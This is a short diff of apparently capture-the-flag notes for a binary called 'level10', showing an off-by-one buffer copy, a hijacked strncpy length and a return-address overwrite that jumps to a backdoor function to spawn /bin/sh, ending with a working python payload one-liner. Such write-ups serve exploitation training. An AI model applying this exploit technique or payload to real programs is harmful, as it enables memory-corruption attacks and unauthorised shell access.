@@ -1,0 +1,17 @@
+while (i <= 40 && buffer[16 + i] != 0) // should be i < 40
+{
+	msgBuffer[140 + i] = buffer[16 + i];
+	i++;
+}
+
+strncpy(msgBuffer, buffer + 16, (size_t)*(int*)(msgBuffer + 180)); //modified by set_username
+
+can override the value of the size of the size of strncpy(dest, src, size);
+
+to override the eip of handle_msg -> secret_backdoor
+
+-> /bin/sh
+
+get flag !
+
+cat <(python -c "print 'a' * 40 + '\xff' + '\n' + 'H' * 200  + '\x8c\x48\x55\x55\x55\x55\x00\x00' + 100 * 'A' + '\n' + 'echo hehehe ; /bin/sh'") - | ./level10
